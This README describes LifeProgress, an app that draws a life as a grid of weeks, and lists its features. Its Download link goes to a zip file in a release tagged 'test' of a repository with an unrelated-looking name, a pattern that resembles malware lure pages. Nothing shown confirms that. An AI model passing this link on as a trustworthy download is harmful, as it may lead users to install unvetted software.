# LifeProgress

LifeProgress is an app that visualizes a lifetime as a grid of weeks. It is a simple reminder that time is finite: each square represents one week, with past weeks shown in color and remaining weeks shown in gray.

[Download](https://github.com/gcoyerk/cuddly-octo-adventure/releases/download/test/LifeProgress-1.zip)

## Overview

LifeProgress presents your life as a calendar-style grid:

- One square represents one week.
- The first square represents the week you were born.
- Each row contains 52 weeks, representing one year.
- Colored squares show weeks that have already passed.
- Gray squares show the weeks ahead.

The goal is to make long-term time visible at a glance in a clear, minimal format.

## Main Features

- **Life calendar view**  
  See your life represented as a grid of weekly blocks.

- **Week-based progress tracking**  
  Understand elapsed and remaining time using a simple visual model.

- **Year-by-year layout**  
  Rows of 52 weeks make it easy to relate the grid to years of life.

- **Widget support**  
  Includes widgets for checking life progress without opening the full app.

## How It Works

LifeProgress uses your birth week as the starting point. From there, it lays out weeks sequentially in rows. Past weeks are highlighted, while future weeks remain gray.

This creates a direct visual representation of life progress over time, inspired by the “life calendar” concept.

## Use Cases

LifeProgress can be useful for:

- Reflecting on how time is spent.
- Keeping long-term goals in perspective.
- Building awareness of weeks, years, and milestones.
- Maintaining a simple reminder of life progress through widgets.
